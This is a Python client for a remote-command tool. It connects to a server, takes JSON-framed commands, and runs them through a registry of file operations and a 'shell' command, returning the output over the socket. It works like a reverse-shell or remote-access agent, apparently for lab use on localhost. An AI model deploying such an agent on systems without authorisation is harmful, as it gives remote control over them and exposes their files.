import json
import socket

import client.client_data as client_data
from client.commands.cat import concatenate_files
from client.commands.cd import change_directory
from client.commands.echo import echo
from client.commands.help import get_help
from client.commands.ls import list_directory
from client.commands.mkdir import make_directory
from client.commands.pwd import print_working_directory
from client.commands.rm import remove
from client.commands.rmdir import remove_directory
from client.commands.sh import shell
from client.commands.touch import touch

# Command registry
COMMANDS = {
    "ls": list_directory,
    "cd": change_directory,
    "pwd": print_working_directory,
    "cat": concatenate_files,
    "rm": remove,
    "rmdir": remove_directory,
    "mkdir": make_directory,
    "touch": touch,
    "echo": echo,
    "shell": shell,
    "help": get_help,
}

ALIASES = {
    "sh": "shell",
    "dir": "ls",
}

def execute_command(command_line):
    args = command_line.split()
    if not args:
        return "[*] No command provided."

    command = args[0]

    if command in ALIASES:
        command = ALIASES[command]

    if command not in COMMANDS:
        return f"[*] Unknown command: `{command}`"

    try:
        result = COMMANDS[command](args)
        return result
    except Exception as e:
        return f"[*] Error executing command `{command}`: {e}"

def keep_alive_client(host='127.0.0.1', port=9999):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print(f"[*] Connected to {host}:{port}")

    buffer = ""
    try:
        while True:
            response = client_socket.recv(4096)
            if not response:
                print("[*]️ Connection closed by server.")
                break

            buffer += response.decode('utf-8')
            while "\n" in buffer:
                message, buffer = buffer.split("\n", 1)
                data = json.loads(message)

                if data.get("type") == "command":
                    command_to_execute = data["payload"]["command"]
                    print(f"[*] Command received: `{command_to_execute}`")

                    output = execute_command(command_to_execute)
                    current_dir = client_data.current_directory

                    response_data = {
                        "type": "response",
                        "payload": {
                            "output": output,
                            "current_directory": current_dir
                        }
                    }

                    client_socket.sendall((json.dumps(response_data) + "\n").encode('utf-8'))
                else:
                    print(f"[*] Unknown message type: {data.get('type')}")
    except Exception as e:
        print(f"[*] Error: {e}")
    finally:
        client_socket.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    keep_alive_client()
